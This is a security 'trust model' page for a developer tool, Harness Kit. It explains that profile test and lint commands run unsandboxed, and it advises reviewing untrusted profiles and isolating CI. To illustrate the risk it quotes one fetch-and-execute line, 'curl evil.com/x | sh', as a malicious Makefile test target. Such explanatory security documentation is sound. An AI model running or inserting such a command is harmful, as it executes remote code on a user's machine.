# Trust model

> **Read this before pulling a `harness.config.json` or `.harness/profile.yaml` from an untrusted source.**

Harness Kit is designed around the principle that **the profile is code**. It's not a static configuration — it's a description of what shell commands the agent (and `harness verify`) should run on your behalf.

## What `harness verify` actually does

`harness verify --tests` and `harness verify --lint` read `.harness/profile.yaml` and run, via subprocess, whatever is in:

- `profile.test_command` — e.g. `python3 -m unittest discover`
- `profile.lint_command` — e.g. `ruff check .`

These commands run with **your current shell's privileges** in the directory you're in. There is no sandbox around them — they are the project's declared tooling.

This is the same trust model as `npm test`, `make test`, `cargo test`, or any other CI command runner: if a stranger sends you a `Makefile` with `test:` set to `curl evil.com/x | sh`, running `make test` runs the malicious script. Harness Kit is no different.

## What this means in practice

- **Trust profiles from people you trust.** A `.harness/profile.yaml` committed to your own repo, written by you or reviewed by you in a PR, is fine.
- **Treat a profile from an unreviewed external PR the same way you'd treat a shell script from that PR.** Don't run `harness verify` on it before reading the file. The `test_command` field is the attack surface.
- **CI systems** running `harness verify` on PRs from forks should already be running tests in an isolated environment (GitHub Actions on `pull_request` does this by default for first-time contributors). The risk surface is the same as running `pytest` on a PR — exactly equivalent, no more, no less.

## What `harness` does NOT execute as user code

The following are **never** invoked as shell commands by Harness Kit itself:

- `forbidden_paths` / `forbidden_commands` / `requires_human_approval` — these are descriptive lists the agent reads, not shell input
- `recommended_mcps` — names only; you have to wire each MCP into your client yourself
- `description` / `conventions` / `success_criteria` / `frameworks` / `name` — text fields, rendered into markdown for the agent to read
- `SKILLS/*/SKILL.md` — markdown files; only the agent reads them, the harness doesn't execute them
- `.harness/manifest.json` — sha256 hashes for drift detection; never executed
- `harness.config.json` — Pydantic-validated metadata; never executed

## What `harness verify` does for blueprint-shipped validators

Validator modules (e.g. `harness/blueprints/python-cli-app/validators/check_tests.py`) are shipped *inside the harness-kit package itself*, not in the user's repo. They're loaded via `importlib.util.spec_from_file_location` and run inside `aegis.synthesize.sandbox` (AST allowlist + restricted exec + SIGALRM/RLIMIT).

So the chain is:

1. **The user's `profile.yaml`** is data — never executed except for `test_command` / `lint_command` strings that `check_tests` / `check_lint` shell out to.
2. **Blueprint validators** are package code, not user code — same trust level as harness-kit itself.
3. **`test_command` and `lint_command`** are the *only* attack surface, and they have the same trust model as `npm test` / `make test`.

## When to be paranoid

If your workflow includes any of:

- Auto-merging external PRs and running `harness verify` in post-merge CI
- Running `harness verify` on a repo you just `git clone`'d from someone you don't know
- Sharing `.harness/profile.yaml` snippets in a "starter template" that strangers will pull and run

…then treat `test_command` and `lint_command` exactly the way you'd treat the entrypoint script of an untrusted package. Read the values first; run them second.

## Hardening recommendations

- **For repos accepting external contributions**: run `harness verify` in a sandboxed CI runner (GitHub Actions ephemeral runner is fine; Docker container is better).
- **For CI**: pin the harness-kit version in your `requirements.txt` / `pyproject.toml` so a supply-chain compromise of a future harness-kit version doesn't auto-apply to your CI runs.
- **For shared profiles**: if you ship a "blessed" `profile.yaml` template, sign the commit that introduces it. Future drift in `test_command` is then visible in `git log`.

## What we are NOT doing

We are deliberately **not**:

- Wrapping `test_command` / `lint_command` in a sandbox — that would break the legitimate use case (running your actual tests, which need filesystem + network access)
- Restricting which commands are allowed — your project decides what `pytest` means
- Encrypting / signing the profile — the trust model is git history, same as the rest of your repo

The right place to lock down the validator's shell is the CI environment, not the harness.

## TL;DR

`harness verify` runs commands you wrote in `profile.yaml`. It will run them as you. If you pulled the profile from someone untrusted, read it before running. Same trust model as `Makefile`, `package.json` scripts, or `pyproject.toml` `[tool.poetry.scripts]`.
